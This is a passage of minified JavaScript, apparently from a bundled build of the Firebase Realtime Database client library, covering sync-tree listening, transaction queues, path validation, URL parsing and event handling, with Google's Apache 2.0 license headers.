a=J1(o,e,n,r);Y1(o)&&(t.syncPointTree_=t.syncPointTree_.remove(s));const u=a.removed;if(l=a.events,!i){const c=u.findIndex(h=>h._queryParams.loadsAllData())!==-1,d=t.syncPointTree_.findOnPath(s,(h,m)=>Pn(m));if(c&&!d){const h=t.syncPointTree_.subtree(s);if(!h.isEmpty()){const m=lN(h);for(let _=0;_<m.length;++_){const v=m[_],w=v.query,p=Wy(t,v);t.listenProvider_.startListening(ss(w),Hl(t,w),p.hashFn,p.onComplete)}}}!d&&u.length>0&&!r&&(c?t.listenProvider_.stopListening(ss(e),null):u.forEach(h=>{const m=t.queryToTagMap.get(wa(h));t.listenProvider_.stopListening(ss(h),m)}))}aN(t,u)}return l}function sN(t,e,n,r){const i=yh(t,r);if(i!=null){const s=wh(i),o=s.path,l=s.queryId,a=Be(o,e),u=new ur(hh(l),a,n);return Eh(t,o,u)}else return[]}function oN(t,e,n,r){const i=yh(t,r);if(i){const s=wh(i),o=s.path,l=s.queryId,a=Be(o,e),u=Q.fromObject(n),c=new Ds(hh(l),a,u);return Eh(t,o,c)}else return[]}function um(t,e,n,r=!1){const i=e._path;let s=null,o=!1;t.syncPointTree_.foreachOnPath(i,(h,m)=>{const _=Be(h,i);s=s||Xr(m,_),o=o||Pn(m)});let l=t.syncPointTree_.get(i);l?(o=o||Pn(l),s=s||Xr(l,H())):(l=new q1,t.syncPointTree_=t.syncPointTree_.set(i,l));let a;s!=null?a=!0:(a=!1,s=A.EMPTY_NODE,t.syncPointTree_.subtree(i).foreachChild((m,_)=>{const v=Xr(_,H());v&&(s=s.updateImmediateChild(m,v))}));const u=jy(l,e);if(!u&&!e._queryParams.loadsAllData()){const h=wa(e);S(!t.queryToTagMap.has(h),"View does not exist, but we have a tag");const m=uN();t.queryToTagMap.set(h,m),t.tagToQueryMap.set(m,h)}const c=fh(t.pendingWriteTree_,i);let d=X1(l,e,n,c,s,a);if(!u&&!o&&!r){const h=Fy(l,e);d=d.concat(cN(t,e,h))}return d}function vh(t,e,n){const i=t.pendingWriteTree_,s=t.syncPointTree_.findOnPath(e,(o,l)=>{const a=Be(o,e),u=Xr(l,a);if(u)return u});return Ay(i,e,s,n,!0)}function eo(t,e){return By(e,t.syncPointTree_,null,fh(t.pendingWriteTree_,H()))}function By(t,e,n,r){if(j(t.path))return Hy(t,e,n,r);{const i=e.get(H());n==null&&i!=null&&(n=Xr(i,H()));let s=[];const o=M(t.path),l=t.operationForChild(o),a=e.children.get(o);if(a&&l){const u=n?n.getImmediateChild(o):null,c=Oy(r,o);s=s.concat(By(l,a,u,c))}return i&&(s=s.concat(_h(i,t,r,n))),s}}function Hy(t,e,n,r){const i=e.get(H());n==null&&i!=null&&(n=Xr(i,H()));let s=[];return e.children.inorderTraversal((o,l)=>{const a=n?n.getImmediateChild(o):null,u=Oy(r,o),c=t.operationForChild(o);c&&(s=s.concat(Hy(c,l,a,u)))}),i&&(s=s.concat(_h(i,t,r,n))),s}function Wy(t,e){const n=e.query,r=Hl(t,n);return{hashFn:()=>(H1(e)||A.EMPTY_NODE).hash(),onComplete:i=>{if(i==="ok")return r?iN(t,n._path,r):rN(t,n._path);{const s=sR(i,n);return Lc(t,n,null,s)}}}}function Hl(t,e){const n=wa(e);return t.queryToTagMap.get(n)}function wa(t){return t._path.toString()+"$"+t._queryIdentifier}function yh(t,e){return t.tagToQueryMap.get(e)}function wh(t){const e=t.indexOf("$");return S(e!==-1&&e<t.length-1,"Bad queryKey."),{queryId:t.substr(e+1),path:new q(t.substr(0,e))}}function Eh(t,e,n){const r=t.syncPointTree_.get(e);S(r,"Missing sync point for query tag that we're tracking");const i=fh(t.pendingWriteTree_,e);return _h(r,n,i,null)}function lN(t){return t.fold((e,n,r)=>{if(n&&Pn(n))return[va(n)];{let i=[];return n&&(i=Uy(n)),Ge(r,(s,o)=>{i=i.concat(o)}),i}})}function ss(t){return t._queryParams.loadsAllData()&&!t._queryParams.isDefault()?new(eN())(t._repo,t._path):t}function aN(t,e){for(let n=0;n<e.length;++n){const r=e[n];if(!r._queryParams.loadsAllData()){const i=wa(r),s=t.queryToTagMap.get(i);t.queryToTagMap.delete(i),t.tagToQueryMap.delete(s)}}}function uN(){return tN++}function cN(t,e,n){const r=e._path,i=Hl(t,e),s=Wy(t,n),o=t.listenProvider_.startListening(ss(e),i,s.hashFn,s.onComplete),l=t.syncPointTree_.subtree(r);if(i)S(!Pn(l.value),"If we're adding a query, it shouldn't be shadowed");else{const a=l.fold((u,c,d)=>{if(!j(u)&&c&&Pn(c))return[va(c).query];{let h=[];return c&&(h=h.concat(Uy(c).map(m=>m.query))),Ge(d,(m,_)=>{h=h.concat(_)}),h}});for(let u=0;u<a.length;++u){const c=a[u];t.listenProvider_.stopListening(ss(c),Hl(t,c))}}return o}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ch{constructor(e){this.node_=e}getImmediateChild(e){const n=this.node_.getImmediateChild(e);return new Ch(n)}node(){return this.node_}}class Sh{constructor(e,n){this.syncTree_=e,this.path_=n}getImmediateChild(e){const n=fe(this.path_,e);return new Sh(this.syncTree_,n)}node(){return vh(this.syncTree_,this.path_)}}const dN=function(t){return t=t||{},t.timestamp=t.timestamp||new Date().getTime(),t},cm=function(t,e,n){if(!t||typeof t!="object")return t;if(S(".sv"in t,"Unexpected leaf node or priority contents"),typeof t[".sv"]=="string")return hN(t[".sv"],e,n);if(typeof t[".sv"]=="object")return fN(t[".sv"],e);S(!1,"Unexpected server value: "+JSON.stringify(t,null,2))},hN=function(t,e,n){switch(t){case"timestamp":return n.timestamp;default:S(!1,"Unexpected server value: "+t)}},fN=function(t,e,n){t.hasOwnProperty("increment")||S(!1,"Unexpected server value: "+JSON.stringify(t,null,2));const r=t.increment;typeof r!="number"&&S(!1,"Unexpected increment value: "+r);const i=e.node();if(S(i!==null&&typeof i<"u","Expected ChildrenNode.EMPTY_NODE for nulls"),!i.isLeafNode())return r;const o=i.getValue();return typeof o!="number"?r:o+r},pN=function(t,e,n,r){return Th(e,new Sh(n,t),r)},$y=function(t,e,n){return Th(t,new Ch(e),n)};function Th(t,e,n){const r=t.getPriority().val(),i=cm(r,e.getImmediateChild(".priority"),n);let s;if(t.isLeafNode()){const o=t,l=cm(o.getValue(),e,n);return l!==o.getValue()||i!==o.getPriority().val()?new ge(l,Ce(i)):t}else{const o=t;return s=o,i!==o.getPriority().val()&&(s=s.updatePriority(new ge(i))),o.forEachChild(le,(l,a)=>{const u=Th(a,e.getImmediateChild(l),n);u!==a&&(s=s.updateImmediateChild(l,u))}),s}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ih{constructor(e="",n=null,r={children:{},childCount:0}){this.name=e,this.parent=n,this.node=r}}function kh(t,e){let n=e instanceof q?e:new q(e),r=t,i=M(n);for(;i!==null;){const s=li(r.node.children,i)||{children:{},childCount:0};r=new Ih(i,r,s),n=G(n),i=M(n)}return r}function Ei(t){return t.node.value}function Vy(t,e){t.node.value=e,Dc(t)}function qy(t){return t.node.childCount>0}function mN(t){return Ei(t)===void 0&&!qy(t)}function Ea(t,e){Ge(t.node.children,(n,r)=>{e(new Ih(n,t,r))})}function Gy(t,e,n,r){n&&!r&&e(t),Ea(t,i=>{Gy(i,e,!0,r)}),n&&r&&e(t)}function gN(t,e,n){let r=n?t:t.parent;for(;r!==null;){if(e(r))return!0;r=r.parent}return!1}function to(t){return new q(t.parent===null?t.name:to(t.parent)+"/"+t.name)}function Dc(t){t.parent!==null&&_N(t.parent,t.name,t)}function _N(t,e,n){const r=mN(n),i=Qt(t.node.children,e);r&&i?(delete t.node.children[e],t.node.childCount--,Dc(t)):!r&&!i&&(t.node.children[e]=n.node,t.node.childCount++,Dc(t))}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const vN=/[\[\].#$\/\u0000-\u001F\u007F]/,yN=/[\[\].#$\u0000-\u001F\u007F]/,mu=10*1024*1024,Ky=function(t){return typeof t=="string"&&t.length!==0&&!vN.test(t)},Yy=function(t){return typeof t=="string"&&t.length!==0&&!yN.test(t)},wN=function(t){return t&&(t=t.replace(/^\/*\.info(\/|$)/,"/")),Yy(t)},EN=function(t,e,n,r){r&&e===void 0||Rh(Wd(t,"value"),e,n)},Rh=function(t,e,n){const r=n instanceof q?new FR(n,t):n;if(e===void 0)throw new Error(t+"contains undefined "+zn(r));if(typeof e=="function")throw new Error(t+"contains a function "+zn(r)+" with contents = "+e.toString());if(Yv(e))throw new Error(t+"contains "+e.toString()+" "+zn(r));if(typeof e=="string"&&e.length>mu/3&&da(e)>mu)throw new Error(t+"contains a string greater than "+mu+" utf8 bytes "+zn(r)+" ('"+e.substring(0,50)+"...')");if(e&&typeof e=="object"){let i=!1,s=!1;if(Ge(e,(o,l)=>{if(o===".value")i=!0;else if(o!==".priority"&&o!==".sv"&&(s=!0,!Ky(o)))throw new Error(t+" contains an invalid key ("+o+") "+zn(r)+`.  Keys must be non-empty strings and can't contain ".", "#", "$", "/", "[", or "]"`);jR(r,o),Rh(t,l,r),zR(r)}),i&&s)throw new Error(t+' contains ".value" child '+zn(r)+" in addition to actual children.")}},Qy=function(t,e,n,r){if(!(r&&n===void 0)&&!Yy(n))throw new Error(Wd(t,e)+'was an invalid path = "'+n+`". Paths must be non-empty strings and can't contain ".", "#", "$", "[", or "]"`)},CN=function(t,e,n,r){n&&(n=n.replace(/^\/*\.info(\/|$)/,"/")),Qy(t,e,n,r)},SN=function(t,e){if(M(e)===".info")throw new Error(t+" failed = Can't modify data under /.info/")},TN=function(t,e){const n=e.path.toString();if(typeof e.repoInfo.host!="string"||e.repoInfo.host.length===0||!Ky(e.repoInfo.namespace)&&e.repoInfo.host.split(":")[0]!=="localhost"||n.length!==0&&!wN(n))throw new Error(Wd(t,"url")+`must be a valid firebase URL and the path can't contain ".", "#", "$", "[", or "]".`)};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class IN{constructor(){this.eventLists_=[],this.recursionDepth_=0}}function Nh(t,e){let n=null;for(let r=0;r<e.length;r++){const i=e[r],s=i.getPath();n!==null&&!oh(s,n.path)&&(t.eventLists_.push(n),n=null),n===null&&(n={events:[],path:s}),n.events.push(i)}n&&t.eventLists_.push(n)}function Xy(t,e,n){Nh(t,n),Jy(t,r=>oh(r,e))}function Gt(t,e,n){Nh(t,n),Jy(t,r=>ft(r,e)||ft(e,r))}function Jy(t,e){t.recursionDepth_++;let n=!0;for(let r=0;r<t.eventLists_.length;r++){const i=t.eventLists_[r];if(i){const s=i.path;e(s)?(kN(t.eventLists_[r]),t.eventLists_[r]=null):n=!1}}n&&(t.eventLists_=[]),t.recursionDepth_--}function kN(t){for(let e=0;e<t.events.length;e++){const n=t.events[e];if(n!==null){t.events[e]=null;const r=n.getEventRunner();Qn&&Pe("event: "+n.toString()),wi(r)}}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const RN="repo_interrupt",NN=25;class PN{constructor(e,n,r,i){this.repoInfo_=e,this.forceRestClient_=n,this.authTokenProvider_=r,this.appCheckProvider_=i,this.dataUpdateCount=0,this.statsListener_=null,this.eventQueue_=new IN,this.nextWriteId_=1,this.interceptServerDataCallback_=null,this.onDisconnect_=Dl(),this.transactionQueueTree_=new Ih,this.persistentConnection_=null,this.key=this.repoInfo_.toURLString()}toString(){return(this.repoInfo_.secure?"https://":"http://")+this.repoInfo_.host}}function xN(t,e,n){if(t.stats_=ih(t.repoInfo_),t.forceRestClient_||uR())t.server_=new Ll(t.repoInfo_,(r,i,s,o)=>{dm(t,r,i,s,o)},t.authTokenProvider_,t.appCheckProvider_),setTimeout(()=>hm(t,!0),0);else{if(typeof n<"u"&&n!==null){if(typeof n!="object")throw new Error("Only objects are supported for option databaseAuthVariableOverride");try{ye(n)}catch(r){throw new Error("Invalid authOverride provided: "+r)}}t.persistentConnection_=new jt(t.repoInfo_,e,(r,i,s,o)=>{dm(t,r,i,s,o)},r=>{hm(t,r)},r=>{ON(t,r)},t.authTokenProvider_,t.appCheckProvider_,n),t.server_=t.persistentConnection_}t.authTokenProvider_.addTokenChangeListener(r=>{t.server_.refreshAuthToken(r)}),t.appCheckProvider_.addTokenChangeListener(r=>{t.server_.refreshAppCheckToken(r.token)}),t.statsReporter_=pR(t.repoInfo_,()=>new h1(t.stats_,t.server_)),t.infoData_=new l1,t.infoSyncTree_=new am({startListening:(r,i,s,o)=>{let l=[];const a=t.infoData_.getNode(r._path);return a.isEmpty()||(l=ya(t.infoSyncTree_,r._path,a),setTimeout(()=>{o("ok")},0)),l},stopListening:()=>{}}),xh(t,"connected",!1),t.serverSyncTree_=new am({startListening:(r,i,s,o)=>(t.server_.listen(r,s,i,(l,a)=>{const u=o(l,a);Gt(t.eventQueue_,r._path,u)}),[]),stopListening:(r,i)=>{t.server_.unlisten(r,i)}})}function AN(t){const n=t.infoData_.getNode(new q(".info/serverTimeOffset")).val()||0;return new Date().getTime()+n}function Ph(t){return dN({timestamp:AN(t)})}function dm(t,e,n,r,i){t.dataUpdateCount++;const s=new q(e);n=t.interceptServerDataCallback_?t.interceptServerDataCallback_(e,n):n;let o=[];if(i)if(r){const a=Cl(n,u=>Ce(u));o=oN(t.serverSyncTree_,s,a,i)}else{const a=Ce(n);o=sN(t.serverSyncTree_,s,a,i)}else if(r){const a=Cl(n,u=>Ce(u));o=nN(t.serverSyncTree_,s,a)}else{const a=Ce(n);o=ya(t.serverSyncTree_,s,a)}let l=s;o.length>0&&(l=Ca(t,s)),Gt(t.eventQueue_,l,o)}function hm(t,e){xh(t,"connected",e),e===!1&&LN(t)}function ON(t,e){Ge(e,(n,r)=>{xh(t,n,r)})}function xh(t,e,n){const r=new q("/.info/"+e),i=Ce(n);t.infoData_.updateSnapshot(r,i);const s=ya(t.infoSyncTree_,r,i);Gt(t.eventQueue_,r,s)}function Zy(t){return t.nextWriteId_++}function bN(t,e,n,r,i){Ah(t,"set",{path:e.toString(),value:n,priority:r});const s=Ph(t),o=Ce(n,r),l=vh(t.serverSyncTree_,e),a=$y(o,l,s),u=Zy(t),c=zy(t.serverSyncTree_,e,a,u,!0);Nh(t.eventQueue_,c),t.server_.put(e.toString(),o.val(!0),(h,m)=>{const _=h==="ok";_||qe("set at "+e+" failed: "+h);const v=Vn(t.serverSyncTree_,u,!_);Gt(t.eventQueue_,e,v),UN(t,i,h,m)});const d=iw(t,e);Ca(t,d),Gt(t.eventQueue_,d,[])}function LN(t){Ah(t,"onDisconnectEvents");const e=Ph(t),n=Dl();Nc(t.onDisconnect_,H(),(i,s)=>{const o=pN(i,s,t.serverSyncTree_,e);ky(n,i,o)});let r=[];Nc(n,H(),(i,s)=>{r=r.concat(ya(t.serverSyncTree_,i,s));const o=iw(t,i);Ca(t,o)}),t.onDisconnect_=Dl(),Gt(t.eventQueue_,H(),r)}function DN(t,e,n){let r;M(e._path)===".info"?r=um(t.infoSyncTree_,e,n):r=um(t.serverSyncTree_,e,n),Xy(t.eventQueue_,e._path,r)}function fm(t,e,n){let r;M(e._path)===".info"?r=Lc(t.infoSyncTree_,e,n):r=Lc(t.serverSyncTree_,e,n),Xy(t.eventQueue_,e._path,r)}function MN(t){t.persistentConnection_&&t.persistentConnection_.interrupt(RN)}function Ah(t,...e){let n="";t.persistentConnection_&&(n=t.persistentConnection_.id+":"),Pe(n,...e)}function UN(t,e,n,r){e&&wi(()=>{if(n==="ok")e(null);else{const i=(n||"error").toUpperCase();let s=i;r&&(s+=": "+r);const o=new Error(s);o.code=i,e(o)}})}function ew(t,e,n){return vh(t.serverSyncTree_,e,n)||A.EMPTY_NODE}function Oh(t,e=t.transactionQueueTree_){if(e||Sa(t,e),Ei(e)){const n=nw(t,e);S(n.length>0,"Sending zero length transaction queue"),n.every(i=>i.status===0)&&FN(t,to(e),n)}else qy(e)&&Ea(e,n=>{Oh(t,n)})}function FN(t,e,n){const r=n.map(u=>u.currentWriteId),i=ew(t,e,r);let s=i;const o=i.hash();for(let u=0;u<n.length;u++){const c=n[u];S(c.status===0,"tryToSendTransactionQueue_: items in queue should all be run."),c.status=1,c.retryCount++;const d=Be(e,c.path);s=s.updateChild(d,c.currentOutputSnapshotRaw)}const l=s.val(!0),a=e;t.server_.put(a.toString(),l,u=>{Ah(t,"transaction put response",{path:a.toString(),status:u});let c=[];if(u==="ok"){const d=[];for(let h=0;h<n.length;h++)n[h].status=2,c=c.concat(Vn(t.serverSyncTree_,n[h].currentWriteId)),n[h].onComplete&&d.push(()=>n[h].onComplete(null,!0,n[h].currentOutputSnapshotResolved)),n[h].unwatcher();Sa(t,kh(t.transactionQueueTree_,e)),Oh(t,t.transactionQueueTree_),Gt(t.eventQueue_,e,c);for(let h=0;h<d.length;h++)wi(d[h])}else{if(u==="datastale")for(let d=0;d<n.length;d++)n[d].status===3?n[d].status=4:n[d].status=0;else{qe("transaction at "+a.toString()+" failed: "+u);for(let d=0;d<n.length;d++)n[d].status=4,n[d].abortReason=u}Ca(t,e)}},o)}function Ca(t,e){const n=tw(t,e),r=to(n),i=nw(t,n);return jN(t,i,r),r}function jN(t,e,n){if(e.length===0)return;const r=[];let i=[];const o=e.filter(l=>l.status===0).map(l=>l.currentWriteId);for(let l=0;l<e.length;l++){const a=e[l],u=Be(n,a.path);let c=!1,d;if(S(u!==null,"rerunTransactionsUnderNode_: relativePath should not be null."),a.status===4)c=!0,d=a.abortReason,i=i.concat(Vn(t.serverSyncTree_,a.currentWriteId,!0));else if(a.status===0)if(a.retryCount>=NN)c=!0,d="maxretry",i=i.concat(Vn(t.serverSyncTree_,a.currentWriteId,!0));else{const h=ew(t,a.path,o);a.currentInputSnapshot=h;const m=e[l].update(h.val());if(m!==void 0){Rh("transaction failed: Data returned ",m,a.path);let _=Ce(m);typeof m=="object"&&m!=null&&Qt(m,".priority")||(_=_.updatePriority(h.getPriority()));const w=a.currentWriteId,p=Ph(t),f=$y(_,h,p);a.currentOutputSnapshotRaw=_,a.currentOutputSnapshotResolved=f,a.currentWriteId=Zy(t),o.splice(o.indexOf(w),1),i=i.concat(zy(t.serverSyncTree_,a.path,f,a.currentWriteId,a.applyLocally)),i=i.concat(Vn(t.serverSyncTree_,w,!0))}else c=!0,d="nodata",i=i.concat(Vn(t.serverSyncTree_,a.currentWriteId,!0))}Gt(t.eventQueue_,n,i),i=[],c&&(e[l].status=2,function(h){setTimeout(h,Math.floor(0))}(e[l].unwatcher),e[l].onComplete&&(d==="nodata"?r.push(()=>e[l].onComplete(null,!1,e[l].currentInputSnapshot)):r.push(()=>e[l].onComplete(new Error(d),!1,null))))}Sa(t,t.transactionQueueTree_);for(let l=0;l<r.length;l++)wi(r[l]);Oh(t,t.transactionQueueTree_)}function tw(t,e){let n,r=t.transactionQueueTree_;for(n=M(e);n!==null&&Ei(r)===void 0;)r=kh(r,n),e=G(e),n=M(e);return r}function nw(t,e){const n=[];return rw(t,e,n),n.sort((r,i)=>r.order-i.order),n}function rw(t,e,n){const r=Ei(e);if(r)for(let i=0;i<r.length;i++)n.push(r[i]);Ea(e,i=>{rw(t,i,n)})}function Sa(t,e){const n=Ei(e);if(n){let r=0;for(let i=0;i<n.length;i++)n[i].status!==2&&(n[r]=n[i],r++);n.length=r,Vy(e,n.length>0?n:void 0)}Ea(e,r=>{Sa(t,r)})}function iw(t,e){const n=to(tw(t,e)),r=kh(t.transactionQueueTree_,e);return gN(r,i=>{gu(t,i)}),gu(t,r),Gy(r,i=>{gu(t,i)}),n}function gu(t,e){const n=Ei(e);if(n){const r=[];let i=[],s=-1;for(let o=0;o<n.length;o++)n[o].status===3||(n[o].status===1?(S(s===o-1,"All SENT items should be at beginning of queue."),s=o,n[o].status=3,n[o].abortReason="set"):(S(n[o].status===0,"Unexpected transaction status in abort"),n[o].unwatcher(),i=i.concat(Vn(t.serverSyncTree_,n[o].currentWriteId,!0)),n[o].onComplete&&r.push(n[o].onComplete.bind(null,new Error("set"),!1,null))));s===-1?Vy(e,void 0):n.length=s+1,Gt(t.eventQueue_,to(e),i);for(let o=0;o<r.length;o++)wi(r[o])}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function zN(t){let e="";const n=t.split("/");for(let r=0;r<n.length;r++)if(n[r].length>0){let i=n[r];try{i=decodeURIComponent(i.replace(/\+/g," "))}catch{}e+="/"+i}return e}function BN(t){const e={};t.charAt(0)==="?"&&(t=t.substring(1));for(const n of t.split("&")){if(n.length===0)continue;const r=n.split("=");r.length===2?e[decodeURIComponent(r[0])]=decodeURIComponent(r[1]):qe(`Invalid query segment '${n}' in query '${t}'`)}return e}const pm=function(t,e){const n=HN(t),r=n.namespace;n.domain==="firebase.com"&&qt(n.host+" is no longer supported. Please use <YOUR FIREBASE>.firebaseio.com instead"),(!r||r==="undefined")&&n.domain!=="localhost"&&qt("Cannot parse Firebase url. Please use https://<YOUR FIREBASE>.firebaseio.com"),n.secure||eR();const i=n.scheme==="ws"||n.scheme==="wss";return{repoInfo:new ly(n.host,n.secure,r,i,e,"",r!==n.subdomain),path:new q(n.pathString)}},HN=function(t){let e="",n="",r="",i="",s="",o=!0,l="https",a=443;if(typeof t=="string"){let u=t.indexOf("//");u>=0&&(l=t.substring(0,u-1),t=t.substring(u+2));let c=t.indexOf("/");c===-1&&(c=t.length);let d=t.indexOf("?");d===-1&&(d=t.length),e=t.substring(0,Math.min(c,d)),c<d&&(i=zN(t.substring(c,d)));const h=BN(t.substring(Math.min(t.length,d)));u=e.indexOf(":"),u>=0?(o=l==="https"||l==="wss",a=parseInt(e.substring(u+1),10)):u=e.length;const m=e.slice(0,u);if(m.toLowerCase()==="localhost")n="localhost";else if(m.split(".").length<=2)n=m;else{const _=e.indexOf(".");r=e.substring(0,_).toLowerCase(),n=e.substring(_+1),s=r}"ns"in h&&(s=h.ns)}return{host:e,port:a,domain:n,subdomain:r,secure:o,scheme:l,pathString:i,namespace:s}};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class sw{constructor(e,n,r,i){this.eventType=e,this.eventRegistration=n,this.snapshot=r,this.prevName=i}getPath(){const e=this.snapshot.ref;return this.eventType==="value"?e._path:e.parent._path}getEventType(){return this.eventType}getEventRunner(){return this.eventRegistration.getEventRunner(this)}toString(){return this.getPath().toString()+":"+this.eventType+":"+ye(this.snapshot.exportVal())}}class ow{constructor(e,n,r){this.eventRegistration=e,this.error=n,this.path=r}getPath(){return this.path}getEventType(){return"cancel"}getEventRunner(){return this.eventRegistration.getEventRunner(this)}toString(){return this.path.toString()+":cancel"}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class WN{constructor(e,n){this.snapshotCallback=e,this.cancelCallback=n}onValue(e,n){this.snapshotCallback.call(null,e,n)}onCancel(e){return S(this.hasCancelCallback,"Raising a cancel event on a listener with no cancel callback"),this.cancelCallback.call(null,e)}get hasCancelCallback(){return!!this.cancelCallback}matches(e){return this.snapshotCallback===e.snapshotCallback||this.snapshotCallback.userCallback!==void 0&&this.snapshotCallback.userCallback===e.snapshotCallback.userCallback&&this.snapshotCallback.context===e.snapshotCallback.context}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class bh{constructor(e,n,r,i){this._repo=e,this._path=n,this._queryParams=r,this._orderByCalled=i}get key(){return j(this._path)?null:gy(this._path)}get ref(){return new Xt(this._repo,this._path)}get _queryIdentifier(){const e=Xp(this._queryParams),n=nh(e);return n==="{}"?"default":n}get _queryObject(){return Xp(this._queryParams)}isEqual(e){if(e=Ie(e),!(e instanceof bh))return!1;const n=this._repo===e._repo,r=oh(this._path,e._path),i=this._queryIdentifier===e._queryIdentifier;return n&&r&&i}toJSON(){return this.toString()}toString(){return this._repo.toString()+UR(this._path)}}class Xt extends bh{constructor(e,n){super(e,n,new ch,!1)}get parent(){const e=vy(this._path);return e===null?null:new Xt(this._repo,e)}get root(){let e=this;for(;e.parent!==null;)e=e.parent;return e}}class Ms{constructor(e,n,r){this._node=e,this.ref=n,this._index=r}get priority(){return this._node.getPriority().val()}get key(){return this.ref.key}get size(){return this._node.numChildren()}child(e){const n=new q(e),r=Wl(this.ref,e);return new Ms(this._node.getChild(n),r,le)}exists(){return!this._node.isEmpty()}exportVal(){return this._node.val(!0)}forEach(e){return this._node.isLeafNode()?!1:!!this._node.forEachChild(this._index,(r,i)=>e(new Ms(i,Wl(this.ref,r),le)))}hasChild(e){const n=new q(e);return!this._node.getChild(n).isEmpty()}hasChildren(){return this._node.isLeafNode()?!1:!this._node.isEmpty()}toJSON(){return this.exportVal()}val(){return this._node.val()}}function Lh(t,e){return t=Ie(t),t._checkNotDeleted("ref"),e!==void 0?Wl(t._root,e):t._root}function Wl(t,e){return t=Ie(t),M(t._path)===null?CN("child","path",e,!1):Qy("child","path",e,!1),new Xt(t._repo,fe(t._path,e))}function lw(t,e){t=Ie(t),SN("set",t._path),EN("set",e,t._path,!1);const n=new ca;return bN(t._repo,t._path,e,null,n.wrapCallback(()=>{})),n.promise}class Dh{constructor(e){this.callbackContext=e}respondsTo(e){return e==="value"}createEvent(e,n){const r=n._queryParams.getIndex();return new sw("value",this,new Ms(e.snapshotNode,new Xt(n._repo,n._path),r))}getEventRunner(e){return e.getEventType()==="cancel"?()=>this.callbackContext.onCancel(e.error):()=>this.callbackContext.onValue(e.snapshot,null)}createCancelEvent(e,n){return this.callbackContext.hasCancelCallback?new ow(this,e,n):null}matches(e){return e instanceof Dh?!e.callbackContext||!this.callbackContext?!0:e.callbackContext.matches(this.callbackContext):!1}hasAnyCallback(){return this.callbackContext!==null}}class Mh{constructor(e,n){this.eventType=e,this.callbackContext=n}respondsTo(e){let n=e==="children_added"?"child_added":e;return n=n==="children_removed"?"child_removed":n,this.eventType===n}createCancelEvent(e,n){return this.callbackContext.hasCancelCallback?new ow(this,e,n):null}createEvent(e,n){S(e.childName!=null,"Child events should have a childName.");const r=Wl(new Xt(n._repo,n._path),e.childName),i=n._queryParams.getIndex();return new sw(e.type,this,new Ms(e.snapshotNode,r,i),e.prevName)}getEventRunner(e){return e.getEventType()==="cancel"?()=>this.callbackContext.onCancel(e.error):()=>this.callbackContext.onValue(e.snapshot,e.prevName)}matches(e){return e 